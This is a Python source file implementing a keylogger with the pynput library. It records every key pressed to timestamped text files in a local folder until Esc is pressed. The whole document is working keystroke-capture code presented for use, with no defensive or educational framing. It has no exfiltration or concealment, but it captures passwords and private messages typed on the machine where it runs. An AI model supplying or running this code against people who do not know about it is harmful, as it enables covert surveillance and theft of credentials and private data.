import os
import time
from pynput import keyboard

class Keylogger:
    def __init__(self):
        self.log_directory = "kelogs"
        if not os.path.exists(self.log_directory):
            os.makedirs(self.log_directory)
        self.log_file_path = self.get_log_file_path()

    def get_log_file_path(self):
        timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
        return os.path.join(self.log_directory, f"{timestamp}.txt")

    def on_press(self, key):
        try:
            with open(self.log_file_path, "a") as log_file:
                log_file.write(f"{key.char}")
        except AttributeError:
            with open(self.log_file_path, "a") as log_file:
                log_file.write(f"[{key}]")

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def start(self):
        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            listener.join()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()
